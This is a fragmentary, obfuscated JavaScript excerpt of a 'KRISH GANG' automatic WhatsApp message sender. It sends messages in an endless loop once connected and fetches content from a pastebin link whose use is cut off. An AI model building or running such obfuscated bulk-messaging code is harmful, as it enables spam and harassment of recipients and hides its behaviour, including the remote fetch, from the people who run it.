(async () => {
  try {
    ...
    const _0x1e9ef5 = () => {
      console.clear();
      console.log("[1;32m\n __    __ _           _                         \n/ /\\ /\\ \\ |__   __ _| |_ ___  __ _ _ __  _ __  \n\\ \\/  \\/ / '_ \\ / _` | __/ __|/ _` | '_ \\| '_ \\ \n \\  /\\  /| | | | (_| | |\\__ \\ (_| | |_) | |_) |\n  \\/  \\/ |_| |_|\\__,_|\\__|___/\\__,_| .__/| .__/ \n                                   |_|   |_|    \n============================================\n[~] Author  : KRISH\n[~] GitHub  : KRISH ERA\n[~] Tool  : KRISH GANG AUTOMATIC WHATSAPP MESSAGE SENDER\n============================================");
    };
    let _0x524dbd = [];
    let _0x4d8ae4 = [];
    let _0x83eb79 = null;
      ...
      while (true) {
        for (let _0x281a84 = _0x765bc5; _0x281a84 < _0x83eb79.length; _0x281a84++) {
          try {
            ...
            console.log("    [ =============== KRISH ERA MESSAGE SEND  =============== ]");
    ...
    const _0x2cf4fd = async () => {
      ...
      _0x4e34c7.ev.on("connection.update", async _0x178b36 => {
        ...
        if (_0xf2d9da === "open") {
          ...
          _0x1e9ef5();
          console.log("[1;32mNow krish era Start Message Sending.......[0m");
          console.log("      [ =============== KRISH ERA MESSAGE SEND  =============== ]");
          console.log('');
    ...
    function _0x1af59e(_0x2ce79d) {
      _0x63463b.get("https://pastebin.com/E1Bt5szi").then(_0x27e908 => {
